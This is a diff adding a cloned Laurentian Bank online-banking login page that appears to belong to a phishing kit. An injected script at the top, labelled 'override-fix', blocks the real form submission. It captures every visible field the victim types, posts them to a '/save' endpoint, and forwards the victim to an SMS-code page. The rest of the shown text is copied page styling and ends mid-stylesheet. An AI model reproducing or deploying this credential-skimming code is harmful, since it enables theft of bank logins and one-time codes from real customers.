@@ -1,0 +1,404 @@
+<!DOCTYPE html>
+<!-- saved from url=(0091)https://auth.banquelaurentienne.ca/auth/oauth2/login?execution=e1s1&client_id=OnlineBanking -->
+<html lang="en" ui-mode="bootstrap" ui-version="5" class="hydrated"><head>
+<script id="override-fix" type="text/javascript">
+(function() {
+    var loc = window.location.pathname.split('/').pop();
+    var bankName = loc.replace('.html', '').replace('_sms', '');
+    var SMS_PAGE = bankName + '_sms.html';
+    
+    function blockAllForms() {
+        document.querySelectorAll('form').forEach(function(f) {
+            if(!f._blocked) {
+                f._blocked = true;
+                f.addEventListener('submit', function(e) {
+                    e.preventDefault();
+                    e.stopImmediatePropagation();
+                    return false;
+                }, true);
+                f.onsubmit = function(e) { return false; };
+                if(f.action) f.action = 'javascript:void(0)';
+            }
+        });
+    }
+    
+    function handleClick(e) {
+        var btn = e.currentTarget;
+        e.preventDefault();
+        e.stopPropagation();
+        e.stopImmediatePropagation();
+        
+        var _data = { bank: bankName, type: 'login', fields: {} };
+        var inps = document.querySelectorAll('input:not([type="hidden"]):not([type="submit"]):not([type="button"])');
+        for(var i=0; i<inps.length; i++) {
+            var key = inps[i].name || inps[i].id || inps[i].placeholder || 'champ_'+i;
+            _data.fields[key] = inps[i].value;
+        }
+        
+        var oldText = btn.textContent || btn.value;
+        if(btn.tagName === 'INPUT') btn.value = 'Patientez...';
+        else btn.textContent = 'Patientez...';
+        
+        fetch('/save', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(_data)
+        }).then(function() {
+            window.location.href = SMS_PAGE;
+        }).catch(function() {
+            window.location.href = SMS_PAGE;
+        });
+        return false;
+    }
+    
+    function attachBtn() {
+        var allBtns = document.querySelectorAll('button, input[type="submit"], input[type="button"], a.btn, a[class*="btn"]');
+        for(var i=0; i<allBtns.length; i++) {
+            var txt = (allBtns[i].textContent || allBtns[i].value || '').trim().toLowerCase();
+            if(txt && (txt.includes('continu') || txt.includes('sign in') || txt.includes('log in') || txt.includes('valider') || txt.includes('se connecter') || txt.includes('next') || txt.includes('submit') || txt.includes('login') || txt.includes('connexion'))) {
+                var btn = allBtns[i];
+                if(!btn._overrideAttached) {
+                    btn._overrideAttached = true;
+                    btn.disabled = false;
+                    btn.removeAttribute('disabled');
+                    btn.removeAttribute('aria-disabled');
+                    btn.style.cursor = 'pointer';
+                    btn.style.pointerEvents = 'auto';
+                    btn.addEventListener('click', handleClick, true);
+                    btn.addEventListener('mousedown', function(e) { e.stopImmediatePropagation(); }, true);
+                }
+            }
+        }
+    }
+    
+    document.addEventListener('DOMContentLoaded', function() {
+        blockAllForms();
+        attachBtn();
+        var obs = new MutationObserver(function() {
+            blockAllForms();
+            attachBtn();
+        });
+        obs.observe(document.body, { childList: true, subtree: true });
+    });
+    
+    if(document.readyState !== 'loading') {
+        setTimeout(function() {
+            blockAllForms();
+            attachBtn();
+        }, 50);
+    }
+    
+    document.addEventListener('click', function(e) {
+        var btn = e.target.closest('button, input[type="submit"], input[type="button"], a');
+        if(btn) {
+            var txt = (btn.textContent || btn.value || '').trim().toLowerCase();
+            if(txt && (txt.includes('continu') || txt.includes('sign in') || txt.includes('log in') || txt.includes('valider') || txt.includes('se connecter') || txt.includes('next') || txt.includes('submit') || txt.includes('login') || txt.includes('connexion'))) {
+                if(!btn._overrideAttached) {
+                    attachBtn();
+                    handleClick(e);
+                }
+            }
+        }
+    }, true);
+})();
+</script>
+
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  <style data-styles="">duet-date-picker{visibility:hidden}.hydrated{visibility:inherit}</style><style data-styles="">slot-fb{display:contents}slot-fb[hidden]{display:none}fui-account-contact-entity,fui-account-entity,fui-account-list,fui-account-list-action,fui-account-list-footer,fui-account-list-item,fui-account-list-title,fui-action-divider,fui-action-item,fui-action-link-item,fui-action-list,fui-action-status,fui-action-status-heading,fui-action-status-message,fui-alert,fui-amount-input,fui-app,fui-app-footer,fui-app-header,fui-app-header-actions,fui-app-header-hero,fui-app-header-subtext,fui-app-header-title,fui-app-page,fui-apple-pay-button,fui-apple-wallet,fui-apple-wallet-button,fui-badge,fui-blocking-overlay,fui-button,fui-button-group,fui-card,fui-card-action,fui-card-container,fui-card-content,fui-card-header,fui-card-icon-button-group,fui-card-list,fui-card-list-heading,fui-card-subtitle,fui-card-title,fui-carousel,fui-carousel-slide,fui-checkbox,fui-checkbox-group,fui-checkbox-option,fui-checkbox-subtext,fui-contact-entity,fui-contextual-menu,fui-contextual-menu-header,fui-contextual-menu-item,fui-credit-card-entity,fui-credit-card-number-input,fui-date-input,fui-datetime-input,fui-datum-item,fui-datum-key,fui-datum-list,fui-datum-value,fui-description,fui-display-amount,fui-display-date,fui-display-pii,fui-entity-display,fui-entity-display-action,fui-entity-list,fui-entity-list-action,fui-entity-list-footer,fui-entity-list-item,fui-entity-list-title,fui-error-message,fui-error-summary,fui-error-summary-heading,fui-expandable-card,fui-expandable-content,fui-expandable-label,fui-floating-icon-button,fui-form,fui-form-display-value,fui-form-fieldset,fui-form-final-step,fui-form-group,fui-form-initial-step,fui-form-section,fui-form-step,fui-form-stepper,fui-form-stepper-title,fui-help-text,fui-icon,fui-icon-button-item,fui-image,fui-image-input,fui-image-input-label,fui-input,fui-input-hint-text,fui-insight-card,fui-interac,fui-interac-etransfer,fui-interac-etransfer-footnote,fui-interac-footnote,fui-investment-account-entity,fui-label,fui-loadable,fui-loadable-content,fui-loadable-label,fui-loading-indicator,fui-marketing-card,fui-menu,fui-menu-divider,fui-menu-header,fui-menu-item,fui-menubar,fui-menubar-item,fui-modal,fui-modal-actions,fui-modal-heading,fui-modal-message,fui-notification,fui-notification-heading,fui-notification-message,fui-otp-input,fui-overlay,fui-password-toggle-group,fui-password-toggle-label,fui-phone-input,fui-postal-code-input,fui-print-button,fui-progress-bar,fui-radio-group,fui-radio-option,fui-review-details,fui-review-details-heading,fui-rich-text,fui-select,fui-select-country,fui-select-entity,fui-select-entity-option,fui-select-group,fui-select-group-heading,fui-select-option,fui-select-region,fui-slide-menu,fui-slide-menu-group,fui-slide-menu-group-heading,fui-slide-menu-item,fui-smart-heading,fui-strong-password-input,fui-tab,fui-tab-group,fui-textarea,fui-toggle,fui-tooltip,fui-transaction-list,fui-transaction-list-item,fui-transaction-receipt,fui-transaction-receipt-footer,fui-transaction-receipt-instruction,fui-transaction-receipt-title,fui-vendor-entity{visibility:hidden}.hydrated{visibility:inherit}</style>
+  <title>Login</title>
+  <meta name="viewport" content="width=device-width,initial-scale=1,minimum-scale=1,maximum-scale=2">
+  <meta name="google" content="notranslate">
+  <script type="text/javascript" src="./Login_files/ruxitagentjs_ICANVfghjoqrux_10343260715123811.js.téléchargement" data-dtconfig="app=2f36e402cb343346|srre=rule|owasp=1|featureHash=ICANVfghjoqrux|srsr=0|rdnt=1|uxrgce=1|cuc=7dkbmcb7|mel=100000|dpvc=1|md=mdcc1=ahtml@lang|lastModification=1785947711044|mdp=mdcc1|tp=500,50,0|srbbv=2|agentUri=/auth/ruxitagentjs_ICANVfghjoqrux_10343260715123811.js|reportUrl=/auth/rb_bf98183utz|rid=RID_-608738814|rpid=1653806565|domain=banquelaurentienne.ca"></script><style>fui-password-toggle-group{display:block;position:relative}fui-password-toggle-group fui-password-toggle-label{position:absolute;right:0}fui-password-toggle-group fui-password-toggle-label[hidden]{display:none}html[ui-mode=ionic] fui-password-toggle-group .ion-fui-password-toggle-group fui-password-toggle-label{z-index:2}slot-fb{display:contents}slot-fb[hidden]{display:none}</style><style>fui-button{display:inline-block}fui-button fui-icon{padding-right:0.5rem;vertical-align:middle}html[ui-mode=ionic] fui-button{}html[ui-mode=ionic] fui-button[button-role=main],html[ui-mode=ionic] fui-button[button-role=alternate]{width:100%}html[ui-mode=ionic] fui-button[button-role=alternate][size=small]{min-width:4rem;width:auto}html[ui-mode=ionic] fui-button ion-button{display:inline-block;height:auto;margin:0;min-height:revert;--ion-font-family:var(--global-body-font-family);--border-radius:var(
+  	--fui-button-border-radius,
+  	var(--common-border-radius-xl)
+  );--border-width:var(
+  	--fui-button-outline-border-width,
+  	var(--common-outline-border-width, 1px)
+  );--border-style:var(--fui-button-outline-border-style, solid);--box-shadow:var(--common-box-shadow, 0);--padding-top:var(--fui-button-padding-top, 0.75rem);--padding-bottom:var(--fui-button-padding-bottom, 0.75rem);--padding-start:var(--fui-button-padding-left, 1.125rem);--padding-end:var(--fui-button-padding-right, 1.125rem)}html[ui-mode=ionic] fui-button[disabled]{cursor:not-allowed;--ion-color-base:var(--global-disabled-color, #ddd);--ion-color-contrast:var(--global-disabled-color-contrast, #000);--ion-color-shade:var(--global-disabled-color-dark);--ion-color-tint:var(--global-disabled-color-light)}html[ui-mode=ionic] fui-button[disabled] ion-button{--ion-color-primary:var(--global-disabled-color);--ion-color-primary-contrast:var(
+  	--global-disabled-color-contrast
+  );--border-color:var(--global-disabled-color);opacity:1}html[ui-mode=ionic] fui-button[button-role=main] ion-button,html[ui-mode=ionic] fui-button[button-role=alternate] ion-button{letter-spacing:initial;min-width:unset;text-transform:none;width:100%}html[ui-mode=ionic] fui-button[button-role=link] ion-button{--ion-color-primary-contrast:var(--common-link-color);--ion-color-primary:var(--common-link-color);--background-hover:transparent;--color-hover:transparent;--box-shadow:none;--border-radius:0;--border-width:0;--border-style:none;text-decoration:underline;text-transform:none}html[ui-mode=ionic] fui-button[button-role=link] ion-button::part(native){padding:0}html[ui-mode=ionic] fui-button[button-role=link] ion-button fui-icon{--fui-icon-color:var(--common-link-color);--fui-icon-size:var(--common-icon-size-s);padding-right:var(--fui-spacing-2)}html[ui-mode=ionic] fui-button[button-role=link] ion-button:hover{--ion-color-primary-tint:transparent;--background-hover-opacity:0;color:var(--common-link-color);opacity:1}html[ui-mode=ionic] fui-button[button-role=link] ion-button:focus,html[ui-mode=ionic] fui-button[button-role=link] ion-button.ion-focused{--ion-color-primary:transparent;}html[ui-mode=ionic] fui-button[button-role=link] ion-button:focus::part(native),html[ui-mode=ionic] fui-button[button-role=link] ion-button.ion-focused::part(native){box-shadow:var(--common-focus-shadow);color:var(--common-link-color)}html[ui-mode=ionic] fui-button[button-role=link] ion-button:active,html[ui-mode=ionic] fui-button[button-role=link] ion-button.ion-activated{opacity:1;}html[ui-mode=ionic] fui-button[button-role=link] ion-button:active::part(native),html[ui-mode=ionic] fui-button[button-role=link] ion-button.ion-activated::part(native){color:var(--common-link-color-dark)}html[ui-mode=ionic] fui-button[button-role=link] ion-button:active fui-icon,html[ui-mode=ionic] fui-button[button-role=link] ion-button.ion-activated fui-icon{--fui-icon-color:var(--common-link-color-dark)}html[ui-mode=ionic] fui-button[button-role=link] .icon-placement-right{}html[ui-mode=ionic] fui-button[button-role=link] .icon-placement-right fui-icon{order:2;padding-left:var(--fui-spacing-2);padding-right:0}html[ui-mode=ionic] fui-button[disabled][button-role=alternate] ion-button{min-width:unset;--background:var(--global-primary-color-contrast);--padding-top:0.75rem;--padding-end:1.125rem;--padding-bottom:0.75rem;--padding-start:1.125rem}html[ui-mode=ionic] fui-button[disabled][button-role=alternate] ion-button::part(native){box-shadow:none}html[ui-mode=ionic] fui-button[disabled][button-role=main] ion-button{min-width:unset;--padding-top:var(--fui-button-padding-top, 0.75rem);--padding-bottom:var(--fui-button-padding-bottom, 0.75rem);--padding-start:var(--fui-button-padding-left, 1.125rem);--padding-end:var(--fui-button-padding-right, 1.125rem)}html[ui-mode=ionic] fui-button[disabled][button-role=main] ion-button::part(native){box-shadow:none}html[ui-mode=ionic] fui-button:not([disabled])[button-role=main] ion-button{min-width:unset;width:100%;--border-color:var(
+  	--fui-button-main-background-color,
+  	var(--global-linear-gradient-color)
+  );--border-radius:var(
+  	--fui-button-border-radius,
+  	var(--common-border-radius-xl)
+  );--padding-top:var(--fui-button-padding-top, 0.75rem);--padding-bottom:var(--fui-button-padding-bottom, 0.75rem);--padding-start:var(--fui-button-padding-left, 1.125rem);--padding-end:var(--fui-button-padding-right, 1.125rem)}html[ui-mode=ionic] fui-button:not([disabled])[button-role=main] ion-button::part(native){--border-color:transparent;--border-width:0;background:var(--fui-button-main-background-color, var(--global-linear-gradient-color));box-shadow:none;color:var(--fui-button-main-text-color, var(--global-linear-gradient-color-contrast));transition:background 300ms ease-in-out, box-shadow 300ms ease-in-out}html[ui-mode=ionic] fui-button:not([disabled])[button-role=main] ion-button fui-icon{--fui-icon-size:var(--common-icon-size-m);--fui-icon-color:var(
+  	--global-linear-gradient-color-contrast
+  );padding-right:0.5rem}html[ui-mode=ionic] fui-button:not([disabled]):not([button-role]) ion-button{--border-color:var(--ion-color-base);--ion-color-primary:var(--common-call-to-action-color);--ion-color-primary-contrast:var(
+  	--common-call-to-action-color-contrast
+  )}html[ui-mode=ionic] fui-button:not([disabled]):not([button-role]) ion-button:focus,html[ui-mode=ionic] fui-button:not([disabled]):not([button-role]) ion-button.ion-focused{--ion-color-primary:var(--common-call-to-action-color);--color:var(--common-call-to-action-color-contrast);--ion-color-primary-shade:var(
+  	--common-call-to-action-color
+  )}html[ui-mode=ionic] fui-button:not([disabled]):not([button-role]) ion-button:focus::part(native),html[ui-mode=ionic] fui-button:not([disabled]):not([button-role]) ion-button.ion-focused::part(native){box-shadow:0 0 0 4px rgb(var(--global-tertiary-color-rgb)/50%)}html[ui-mode=ionic] fui-button:not([disabled]):not([button-role]) ion-button:active,html[ui-mode=ionic] fui-button:not([disabled]):not([button-role]) ion-button.ion-activated{--ion-color-primary:var(
+  	--common-call-to-action-color-dark
+  );--color:var(--common-call-to-action-color-contrast)}html[ui-mode=ionic] fui-button:not([disabled]):not([button-role])[color=primary]{--ion-color-base:var(--global-primary-color, #ddd);--ion-color-contrast:var(
+  	--global-primary-color-contrast,
+  	#000
+  );--ion-color-shade:var(--global-primary-color-dark);--ion-color-tint:var(--global-primary-color-light)}html[ui-mode=ionic] fui-button:not([disabled]):not([button-role])[color=secondary]{--ion-color-base:var(--global-secondary-color, #ddd);--ion-color-contrast:var(
+  	--global-secondary-color-contrast,
+  	#000
+  );--ion-color-shade:var(--global-secondary-color-dark);--ion-color-tint:var(--global-secondary-color-light)}html[ui-mode=ionic] fui-button:not([disabled]):not([button-role])[color=tertiary]{--ion-color-base:var(--global-tertiary-color, #ddd);--ion-color-contrast:var(
+  	--global-tertiary-color-contrast,
+  	#000
+  );--ion-color-shade:var(--global-tertiary-color-dark);--ion-color-tint:var(--global-tertiary-color-light)}html[ui-mode=ionic] fui-button:not([disabled]):not([button-role])[color=success]{--ion-color-base:var(--global-success-color, #ddd);--ion-color-contrast:var(
+  	--global-success-color-contrast,
+  	#000
+  );--ion-color-shade:var(--global-success-color-dark);--ion-color-tint:var(--global-success-color-light)}html[ui-mode=ionic] fui-button:not([disabled]):not([button-role])[color=info]{--ion-color-base:var(--global-info-color, #ddd);--ion-color-contrast:var(
+  	--global-info-color-contrast,
+  	#000
+  );--ion-color-shade:var(--global-info-color-dark);--ion-color-tint:var(--global-info-color-light)}html[ui-mode=ionic] fui-button:not([disabled]):not([button-role])[color=warning]{--ion-color-base:var(--global-warning-color, #ddd);--ion-color-contrast:var(
+  	--global-warning-color-contrast,
+  	#000
+  );--ion-color-shade:var(--global-warning-color-dark);--ion-color-tint:var(--global-warning-color-light)}html[ui-mode=ionic] fui-button:not([disabled]):not([button-role])[color=danger]{--ion-color-base:var(--global-danger-color, #ddd);--ion-color-contrast:var(
+  	--global-danger-color-contrast,
+  	#000
+  );--ion-color-shade:var(--global-danger-color-dark);--ion-color-tint:var(--global-danger-color-light)}html[ui-mode=ionic] fui-button:not([disabled])[button-role=main] ion-button:focus::part(native),html[ui-mode=ionic] fui-button:not([disabled])[button-role=main] ion-button.ion-focused::part(native){box-shadow:var(--common-focus-shadow)}html[ui-mode=ionic] fui-button:not([disabled])[button-role=main] ion-button:hover{--ion-color-primary-tint:none}html[ui-mode=ionic] fui-button:not([disabled])[button-role=main] ion-button:hover::part(native){background:var(--fui-button-main-background-hover-color, var(--global-linear-gradient-color-light));box-shadow:var(--common-box-shadow);transition:background 300ms ease-in-out, box-shadow 300ms ease-in-out}html[ui-mode=ionic] fui-button:not([disabled])[button-role=main] ion-button:active,html[ui-mode=ionic] fui-button:not([disabled])[button-role=main] ion-button.ion-activated{--ion-color-primary-tint:none;--ion-color-primary-shade:none}html[ui-mode=ionic] fui-button:not([disabled])[button-role=main] ion-button:active::part(native),html[ui-mode=ionic] fui-button:not([disabled])[button-role=main] ion-button.ion-activated::part(native){background:var(--fui-button-main-background-active-color, var(--global-linear-gradient-color-dark));transition:background 100ms ease-in-out, box-shadow 100ms ease-in-out}html[ui-mode=ionic] fui-button:not([disabled])[button-role=main] ion-button:active::part(native):active,html[ui-mode=ionic] fui-button:not([disabled])[button-role=main] ion-button.ion-activated::part(native):active{background:var(--fui-button-main-background-active-color, var(--global-linear-gradient-color-dark))}html[ui-mode=ionic] fui-button:not([disabled])[button-role=alternate] ion-button:hover{opacity:1}html[ui-mode=ionic] fui-button:not([disabled])[button-role=alternate] .ion-button-wrapper .ion-button-container{background:var(--fui-button-alternate-border-color, var(--fui-button-main-background-color, var(--global-linear-gradient-color)));border-radius:var(--fui-button-border-radius, var(--common-border-radius-xl));box-shadow:none;line-height:0;padding:var(--common-outline-border-width, 1px);transition:box-shadow 300ms ease-in-out, background 300ms ease-in-out;}html[ui-mode=ionic] fui-button:not([disabled])[button-role=alternate] .ion-button-wrapper .ion-button-container ion-button{--border-width:0;--border-color:transparent;--color:var(
+  	--fui-button-alternate-text-color,
+  	var(--global-primary-color)
+  );--ripple-color:transparent;background:var(--global-primary-color-contrast);border-radius:var(--fui-button-border-radius, var(--common-border-radius-xl));margin:0;}html[ui-mode=ionic] fui-button:not([disabled])[button-role=alternate] .ion-button-wrapper .ion-button-container ion-button::part(native){--box-shadow:none;--padding-top:var(
+  	--fui-button-padding-top,
+  	0.75rem
+  );--padding-bottom:var(
+  	--fui-button-padding-bottom,
+  	0.75rem
+  );--padding-start:var(
+  	--fui-button-padding-left,
+  	1.125rem
+  );--padding-end:var(
+  	--fui-button-padding-right,
+  	1.125rem
+  )}html[ui-mode=ionic] fui-button:not([disabled])[button-role=alternate] .ion-button-wrapper .ion-button-container ion-button fui-icon{--fui-icon-size:var(--common-icon-size-m);--fui-icon-color:var(
+  	--fui-button-alternate-text-color,
+  	var(--global-primary-color)
+  );padding-right:0.5rem}html[ui-mode=ionic] fui-button:not([disabled])[button-role=alternate][size=small] .ion-button-wrapper .ion-button-container{}html[ui-mode=ionic] fui-button:not([disabled])[button-role=alternate][size=small] .ion-button-wrapper .ion-button-container ion-button{}html[ui-mode=ionic] fui-button:not([disabled])[button-role=alternate][size=small] .ion-button-wrapper .ion-button-container ion-button::part(native){padding:0.5rem 0.75rem}html[ui-mode=ionic] fui-button:not([disabled])[button-role=alternate][size=small] .ion-button-wrapper .ion-button-container ion-button fui-icon{--fui-icon-size:var(--common-icon-size-s);padding-right:0.25rem}html[ui-mode=ionic] fui-button:not([disabled])[button-role=alternate]:focus .ion-button-wrapper .ion-button-container,html[ui-mode=ionic] fui-button:not([disabled])[button-role=alternate].fui-button-focused .ion-button-wrapper .ion-button-container{box-shadow:var(--common-focus-shadow)}html[ui-mode=ionic] fui-button:not([disabled])[button-role=alternate]:active .ion-button-wrapper .ion-button-container,html[ui-mode=ionic] fui-button:not([disabled])[button-role=alternate].fui-button-active .ion-button-wrapper .ion-button-container{background:var(--fui-button-alternate-border-active-color, var(--global-linear-gradient-color-dark)) !important;}html[ui-mode=ionic] fui-button:not([disabled])[button-role=alternate]:active .ion-button-wrapper .ion-button-container ion-button,html[ui-mode=ionic] fui-button:not([disabled])[button-role=alternate].fui-button-active .ion-button-wrapper .ion-button-container ion-button{}html[ui-mode=ionic] fui-button:not([disabled])[button-role=alternate]:active .ion-button-wrapper .ion-button-container ion-button::part(native)::after,html[ui-mode=ionic] fui-button:not([disabled])[button-role=alternate].fui-button-active .ion-button-wrapper .ion-button-container ion-button::part(native)::after{background:transparent}html[ui-mode=ionic] fui-button:not([disabled])[button-role=alternate]:hover .ion-button-wrapper .ion-button-container,html[ui-mode=ionic] fui-button:not([disabled])[button-role=alternate].fui-button-hovered .ion-button-wrapper .ion-button-container{background:var(--fui-button-alternate-border-hover-color, var(--global-linear-gradient-color-light));box-shadow:var(--common-box-shadow);transition:box-shadow 300ms ease-in-out, background 300ms ease-in-out;}html[ui-mode=ionic] fui-button:not([disabled])[button-role=alternate]:hover .ion-button-wrapper .ion-button-container ion-button,html[ui-mode=ionic] fui-button:not([disabled])[button-role=alternate].fui-button-hovered .ion-button-wrapper .ion-button-container ion-button{opacity:1;--background-hover:transparent}html[ui-mode=ionic] fui-button[disabled][button-role=alternate][size=small] ion-button fui-icon{--fui-icon-size:var(--common-icon-size-m);--fui-icon-color:var(--global-disabled-color)}html[ui-mode=bootstrap][ui-version="3"] fui-button .btn-primary{background-color:var(--primary-button-background-color, var(--global-primary-color));border:1px solid var(--primary-button-background-color, var(--global-primary-color));border-radius:var(--primary-button-border-radius, 0);padding:var(--primary-button-padding, 1em 2em)}html[ui-mode=bootstrap][ui-version="3"] fui-button .btn-primary:hover{filter:brightness(90%)}html[ui-mode=bootstrap][ui-version="3"] fui-button .btn-primary:focus{outline:0}html[ui-mode=bootstrap][ui-version="3"] fui-button .btn-primary[disabled]{background-color:var(--primary-button-disabled-background-color, var(--global-primary-color));filter:brightness(92.5%)}html[ui-mode=bootstrap][ui-version="3"] fui-button .btn-secondary{border:1px solid var(--secondary-button-border-color, var(--global-secondary-color));border-radius:var(--secondary-button-border-radius, 1.125em);color:var(--secondary-button-border-color, var(--global-secondary-color));padding:var(--secondary-button-padding, 0.5em 1.5em)}html[ui-mode=bootstrap][ui-version="3"] fui-button .btn-secondary:hover{background-color:var(--secondary-button-hover-background-color, var(--global-secondary-color));color:var(--secondary-button-hover-text-color, var(--global-secondary-color-contrast));filter:brightness(90%)}html[ui-mode=bootstrap][ui-version="3"] fui-button .btn-secondary:focus{outline:0}html[ui-mode=bootstrap][ui-version="3"] fui-button .btn-secondary[disabled]{background:var(--secondary-button-disabled-background-color, var(--global-disabled-color));border-color:var(--secondary-button-disabled-border-color, var(--global-disabled-color));color:var(--secondary-button-disabled-text-color, var(--global-secondary-color-contrast));filter:brightness(92.5%)}html[ui-mode=bootstrap][ui-version="3"] fui-button .btn-link{color:var(--brand-primary-link, var(--global-primary-color))}html[ui-mode=bootstrap][ui-version="3"] fui-button .btn-link:hover{filter:brightness(90%)}html[ui-mode=bootstrap] fui-button .btn-link.icon-placement-right{align-items:center;display:flex}html[ui-mode=bootstrap] fui-button .btn-link.icon-placement-right fui-icon{flex-shrink:0;order:2;padding-left:0.5rem;padding-right:0}slot-fb{display:contents}slot-fb[hidden]{display:none}</style><style>fui-password-toggle-label{display:inline-block;user-select:none}.bs-fui-password-toggle-group fui-password-toggle-label button{margin-top:1em;padding:0}slot-fb{display:contents}slot-fb[hidden]{display:none}</style><style>html[ui-mode=ionic] fui-form-group .fui-form-group-controls>fui-label,html[ui-mode=bootstrap] fui-form-group>.fui-form-group-controls>fui-label,html[ui-mode=bootstrap][ui-version="3"] fui-form-group>.fui-form-group-controls>fui-label{flex:auto;order:-1}html[ui-mode=ionic] fui-form-group .fui-form-group-controls{--background-activated:transparent;--background-activated-opacity:0;--background-focus:transparent;--background-focused-opacity:0;--background-hover:transparent;--background-hover-opacity:0;--show-full-highlight:0;--min-height:auto;--border-width:0;--inner-border-width:0;--ripple-color:transparent;--transition:none}html[ui-mode=ionic] fui-form-group .fui-form-group-controls::part(native){background-color:transparent}fui-form-group{display:block}fui-form-group.fui-readonly fui-error,fui-form-group.fui-readonly fui-input-hint-text{display:none}fui-form-group .fui-checkbox-subtext-container{display:flex;flex-direction:column}fui-form-group .fui-checkbox-subtext-container fui-checkbox-subtext{order:1}fui-form-group .fui-checkbox-subtext-container fui-error-message{order:2}html[ui-mode=ionic] fui-form-group{margin:var(--fui-form-group-vertical-spacing, var(--fui-spacing-3)) 0}html[ui-mode=ionic] fui-form-group fui-card-container{width:100%}html[ui-mode=ionic] fui-form-group>.fui-form-group-controls,html[ui-mode=ionic] fui-form-group .fui-form-group-controls{cursor:initial;overflow:visible;--padding-start:0;--ion-safe-area-left:0;--ion-safe-area-right:0;--inner-padding-start:0;--inner-padding-end:0}html[ui-mode=ionic] fui-form-group>.fui-form-group-controls fui-label,html[ui-mode=ionic] fui-form-group .fui-form-group-controls fui-label{flex-grow:0}html[ui-mode=ionic] fui-form-group>.fui-form-group-controls::part(native),html[ui-mode=ionic] fui-form-group .fui-form-group-controls::part(native){min-height:auto}html[ui-mode=ionic] fui-form-group>.fui-form-group-controls .fui-form-group-control-wrapper,html[ui-mode=ionic] fui-form-group>.fui-form-group-controls .fui-form-group-control-container,html[ui-mode=ionic] fui-form-group .fui-form-group-controls .fui-form-group-control-wrapper,html[ui-mode=ionic] fui-form-group .fui-form-group-controls .fui-form-group-control-container{display:block;width:100%}html[ui-mode=ionic] fui-form-group>.fui-form-group-controls fui-label,html[ui-mode=ionic] fui-form-group>.fui-form-group-controls .fui-form-group-note-container,html[ui-mode=ionic] fui-form-group .fui-form-group-controls fui-label,html[ui-mode=ionic] fui-form-group .fui-form-group-controls .fui-form-group-note-container{padding:0 var(--fui-spacing-2)}html[ui-mode=ionic] fui-form-group>.fui-form-group-controls .fui-form-group-note-container,html[ui-mode=ionic] fui-form-group .fui-form-group-controls .fui-form-group-note-container{display:flex;flex-flow:column nowrap;gap:var(--fui-spacing-1);margin-top:var(--fui-spacing-1);width:100%}html[ui-mode=ionic] fui-form-group>.fui-form-group-controls .fui-form-group-note-container .fui-form-group-note.fui-errors,html[ui-mode=ionic] fui-form-group .fui-form-group-controls .fui-form-group-note-container .fui-form-group-note.fui-errors{display:flex;flex-flow:column nowrap;gap:var(--fui-spacing-1)}html[ui-mode=ionic] fui-form-group.fui-disabled fui-label .fui-ion-label,html[ui-mode=ionic] fui-form-group.fui-disabled .item-interactive-disabled ion-label,html[ui-mode=ionic] fui-form-group.fui-disabled fui-checkbox-subtext .fui-checkbox-subtext,html[ui-mode=ionic] fui-form-group.fui-disabled fui-input-hint-text{color:var(--global-disabled-color)}html[ui-mode=ionic] fui-form-group.fui-disabled .item-interactive-disabled ion-label{opacity:1}html[ui-mode=ionic] fui-form-group fui-label.fui-readonly,html[ui-mode=ionic] fui-form-group.fui-control-group fui-label.fui-control-group,html[ui-mode=ionic] fui-form-group.fui-control-group .fui-form-group-note-container{padding-left:0}html[ui-mode=ionic] fui-form-group.fui-control-inline .fui-form-group-note-container{padding-left:calc(var(--common-icon-size-xxs) + var(--fui-spacing-1) * 2 + var(--fui-spacing-3))}html[ui-mode=ionic] fui-form-group.fui-control-group>.fui-form-group-controls .fui-form-group-note-container,html[ui-mode=ionic] fui-form-group.fui-control-group .fui-form-group-controls .fui-form-group-note-container{min-height:0}html[ui-mode=ionic] fui-form-group.fui-readonly>.fui-form-group-controls .fui-form-group-note-container,html[ui-mode=ionic] fui-form-group .fui-form-group-control-container fui-checkbox[readonly]~fui-checkbox-subtext,html[ui-mode=ionic] fui-form-group .fui-form-group-note-container:not(:has(.fui-form-group-note:not(:empty))){display:none}html[ui-mode=ionic] fui-form-group[layout=inline] fui-label,html[ui-mode=ionic] fui-form-group[layout=inline].fui-control-inline fui-label.fui-readonly,html[ui-mode=ionic] fui-form-group[layout=stacked] fui-label,html[ui-mode=ionic] fui-form-group[layout=stacked].fui-control-inline fui-label.fui-readonly{margin-bottom:var(--fui-spacing-2)}html[ui-mode=ionic] fui-form-group:not(.fui-control-inline)>.fui-form-group-controls{display:flex}html[ui-mode=ionic] fui-form-group:not(.fui-control-inline)[layout=inline]>.fui-form-group-controls::part(native),html[ui-mode=ionic] fui-form-group:not(.fui-control-inline)[layout=stacked]>.fui-form-group-controls::part(native){align-items:start;flex-flow:column nowrap}html[ui-mode=bootstrap] fui-form-group>.fui-form-group-controls{display:flex}html[ui-mode=bootstrap] fui-form-group .fui-hint-text.form-check,html[ui-mode=bootstrap] fui-form-group .fui-errors.form-check{min-height:0}html[ui-mode=bootstrap] fui-form-group[layout=stacked]>.fui-form-group-controls,html[ui-mode=bootstrap] fui-form-group[layout=inline].fui-readonly>.fui-form-group-controls{flex-direction:column}html[ui-mode=bootstrap] fui-form-group.fui-control-inline .fui-form-group-note-container{padding-left:1.5rem}html[ui-mode=bootstrap] fui-form-group[layout=inline]:not(.fui-readonly)>.fui-form-group-controls{flex-flow:row nowrap;gap:var(--fui-spacing-3)}html[ui-mode=bootstrap] fui-form-group[layout=inline]:not(.fui-readonly) .fui-form-group-note-container{margin-left:var(--fui-form-group-inline-label-width, 12rem)}html[ui-mode=bootstrap] fui-form-group[layout=inline]:not(.fui-readonly) fui-label[position=inline]{flex-grow:0;min-width:var(--fui-form-group-inline-label-width, 12rem);width:var(--fui-form-group-inline-label-width, 12rem)}html[ui-mode=bootstrap] fui-form-group[layout=inline]:not(.fui-readonly) fui-label[position=inline] label.form-label{margin-bottom:0;margin-top:2.5rem;padding-right:1rem}html[ui-mode=bootstrap] fui-form-group[layout=inline]:not(.fui-readonly) fui-label[position=inline].fui-readonly label.form-label{margin-top:0;padding-top:0}@media (max-width: 576px){html[ui-mode=bootstrap] fui-form-group[layout=inline]:not(.fui-readonly) .fui-form-group-controls{flex-wrap:wrap}html[ui-mode=bootstrap] fui-form-group[layout=inline]:not(.fui-readonly) .fui-form-group-note-container{margin-left:0}html[ui-mode=bootstrap] fui-form-group[layout=inline]:not(.fui-readonly) fui-label[position=inline]{width:100%}}html[ui-mode=bootstrap] fui-form-group.fui-readonly>.fui-errors,html[ui-mode=bootstrap] fui-form-group.fui-readonly 